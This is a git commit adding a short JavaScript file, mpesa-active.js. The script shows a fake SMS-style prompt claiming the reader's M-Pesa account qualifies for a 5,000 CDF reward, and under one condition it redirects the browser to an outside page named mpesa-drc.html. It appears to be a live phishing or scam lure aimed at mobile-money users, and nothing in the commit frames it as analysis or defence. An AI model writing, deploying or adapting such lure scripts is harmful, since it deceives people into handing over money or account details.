9a3a1e8f14178e18f9ba637656ff96755428439d
dhatablog <williamsnsiako@gmail.com>
2025-09-27 08:30:08 +0100

    Create mpesa-active.js

---
+++ mpesa-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 5 000 CDF'
+password=prompt('SMS: Félicitations, votre numéro de compte M-pesa est éligible pour recevoir une récompense de 5 000 CDF pour les anciens clients, click OK to withdraw cash','RETIRER 5 000 CDF');
+if (password != 'RETIRER 5 000 CDF') {
+location.href='https://eahigh.org/mpesa-drc.html';
+}
